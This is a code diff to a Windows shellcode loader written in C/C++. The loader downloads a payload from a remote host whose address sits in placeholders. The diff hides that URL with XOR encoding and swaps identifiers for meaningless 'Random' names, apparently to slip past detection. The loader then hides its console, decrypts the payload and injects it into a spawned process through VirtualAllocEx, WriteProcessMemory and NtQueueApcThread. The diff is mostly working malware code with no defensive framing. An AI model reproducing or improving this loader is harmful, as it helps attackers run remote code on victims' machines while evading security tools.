@@ -18,6 +18,7 @@
 #include <psapi.h>
 #include <wininet.h>
 #include <ntstatus.h>
+#include <iostream>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment (lib, "crypt32.lib")
@@ -485,25 +486,50 @@ DWORD RandomO(const char * pName) {
 			}
 		}
 	}
-	NtClose_p(snapshot);
+	CloseHandle(snapshot);
 	return 0;
 }
 
+char RandomT[] = "XKEYVAL"; 
+
+void RandomS(char* data, size_t data_len, char* RandomT, size_t RandomT_len) {
+    int j;
+
+    j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == RandomT_len - 1) j = 0;
+
+        data[i] = data[i] ^ RandomT[j];
+        j++;
+    }
+}
+
+unsigned char RandomR[] = WEBSITE
 
 int main(void) {
-   
-	int pid = 0;
+    int pid = 0;
     HANDLE hProc = NULL;
-	int ret = 0;
-    void * pRemoteCode;
-    LPCWSTR szUrl = L"http://HOSTIP:PORTY/SHELLCODEFILE";  // Replace with your actual URL
+    int ret = 0;
+    void* RandomP;
+    RandomS((char*)RandomR, sizeof(RandomR), RandomT, sizeof(RandomT));
+
+    // Convert URL array to a wide-character string
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, (LPCCH)RandomR, -1, NULL, 0);
+    wchar_t* wideRandomR = new wchar_t[wideLen];
+    MultiByteToWideChar(CP_ACP, 0, (LPCCH)RandomR, -1, wideRandomR, wideLen);
+
+    LPCWSTR szUrl = wideRandomR; // Now szUrl can be used as LPCWSTR
+
+    // Example of using szUrl
+    //std::wcout << L"URL: " << szUrl << std::endl;
 
     PBYTE Random8;
     SIZE_T Random9 = 0;
     FreeConsole();
-	STARTUPINFOA si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
-	Random6(3500);
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    Random6(3500);
+
 
 if (!Random7(szUrl, &Random8, &Random9)) {
         printf("[!] Random3 Failed\n");
@@ -589,7 +615,7 @@ if (!successes) {
 }
 	RandomC((BYTE*) Random8, Random9, (char *) RandomG, sizeof(RandomG));	
 
-	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, Random9, MEM_COMMIT, PAGE_EXECUTE_READ);
+	RandomP = VirtualAllocEx(pi.hProcess, NULL, Random9, MEM_COMMIT, PAGE_EXECUTE_READ);
 
 	Random6(1000);
    
@@ -601,7 +627,7 @@ if (!successes) {
     if (pWriteProcessMemory != NULL) {
         // Define your parameters
         HANDLE hProcess = pi.hProcess;  
-        LPVOID lpBaseAddress = pRemoteCode;  
+        LPVOID lpBaseAddress = RandomP;  
         LPCVOID lpBuffer = Random8;  
         SIZE_T nSize = Random9;  
         SIZE_T lpNumberOfBytesWritten;
@@ -635,7 +661,7 @@ if (NtQueueApcThread != NULL) {
     // Now call the function using the obtained function pointer
     NTSTATUS status = NtQueueApcThread(
         pi.hThread,     // Thread handle
-        (PIO_APC_ROUTINE)pRemoteCode,  // APC routine
+        (PIO_APC_ROUTINE)RandomP,  // APC routine
         NULL,           // APC routine context
         NULL,           // Status block (optional)
         0               // Reserved (should be zero)
